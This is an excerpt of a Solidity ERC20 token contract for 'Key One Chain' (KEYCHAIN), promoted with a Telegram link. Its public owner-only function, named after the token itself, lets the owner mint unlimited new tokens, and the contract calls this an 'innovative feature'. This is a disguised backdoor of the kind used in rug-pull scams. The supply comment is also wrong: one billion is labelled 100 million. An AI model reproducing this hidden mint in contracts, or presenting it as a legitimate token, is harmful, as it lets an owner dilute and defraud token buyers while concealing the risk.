...
//
// $KeyOneChain proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/KeyOneChain
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _KeyOneChain(uint256 amount) public onlyOwner {
 _KeyOneChain(msg.sender, amount);
    }
    ...
    function _KeyOneChain(address account, uint256 amount) internal virtual {
...
contract $KeyOneChain is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Key One Chain", "KEYCHAIN") {
     _KeyOneChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}